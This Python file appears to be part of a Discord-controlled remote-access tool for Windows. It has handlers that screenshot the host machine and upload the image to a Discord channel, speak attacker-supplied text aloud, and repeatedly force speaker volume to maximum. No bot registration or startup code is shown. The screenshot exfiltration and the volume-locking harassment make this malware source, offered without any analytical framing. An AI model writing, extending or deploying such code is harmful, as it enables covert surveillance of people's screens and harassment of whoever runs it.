import pyautogui, os, io, discord, threading, pyttsx3, pythoncom, time, win32net, psutil
from discord.ext import commands
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from PIL import ImageGrab
async def take_screenshot(ctx):
 screenshot = pyautogui.screenshot()
 with io.BytesIO() as image_binary:
  screenshot.save(image_binary, format="PNG")
  image_binary.seek(0)
  await ctx.send("Here is your screenshot:", file=discord.File(image_binary, filename="screenshot.png"))
def speak_in_background(message):
 pythoncom.CoInitialize()
 engine = pyttsx3.init()
 engine.setProperty('rate', 130)
 engine.say(message)
 engine.runAndWait()
 pythoncom.CoUninitialize()
async def speak_command(ctx, *, message: str):
 await ctx.send(f"Saying: {message}")
 thread = threading.Thread(target=speak_in_background, args=(message,), daemon=True)
 thread.start()
bassboost_active = False

def set_volume_to_max():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_,
        23,
        None
    )
    volume = interface.QueryInterface(IAudioEndpointVolume)
    volume.SetMasterVolumeLevelScalar(1.0, None)

def bassboost_thread():
    pythoncom.CoInitialize()
    while bassboost_active:
        set_volume_to_max()
        time.sleep(0.1)
    pythoncom.CoUninitialize()
async def bassboost_command(ctx, action: str):
    global bassboost_active    
    if action == "start":
        if bassboost_active:
            await ctx.send("Bass boost is already active!")
        else:
            bassboost_active = True
            await ctx.send("Bass boost activated!")
            thread = threading.Thread(target=bassboost_thread, daemon=True)
            thread.start()
    elif action == "stop":
        if not bassboost_active:
            await ctx.send("Bass boost is not active!")
        else:
            bassboost_active = False
            await ctx.send("Bass boost deactivated!")
    else:
        await ctx.send("Invalid action. Use 'start' or 'stop'.")